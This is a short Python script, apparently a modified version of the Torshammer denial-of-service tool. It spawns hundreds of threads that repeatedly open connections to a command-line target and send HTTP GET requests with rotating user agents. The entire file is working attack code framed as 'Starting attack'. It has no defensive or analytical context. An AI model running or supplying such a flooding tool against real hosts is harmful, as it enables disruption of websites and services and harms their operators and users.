import sys
import socket
import random
import threading
import time

print("\nTorshammer - Modified for Python3")
print("Starting attack...\n")

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def usage():
    print("Usage: python3 torshammer.py -t <target> [-r <threads>]")

def hammer(target, port=80):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            packet = f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n"
            packet += f"Host: {target}\r\n"
            packet += f"User-Agent: {random.choice(useragents)}\r\n"
            packet += "Connection: keep-alive\r\n\r\n"
            s.send(packet.encode())
            print(f"Sent packet to {target}")
            time.sleep(0.1)
        except:
            s.close()
            print(f"Connection to {target} failed")

def main():
    if len(sys.argv) < 3:
        usage()
        sys.exit()

    target = sys.argv[2]
    threads = 200  # default

    if "-r" in sys.argv:
        threads = int(sys.argv[sys.argv.index("-r") + 1])

    for i in range(threads):
        t = threading.Thread(target=hammer, args=(target,))
        t.start()

if __name__ == "__main__":
    main()
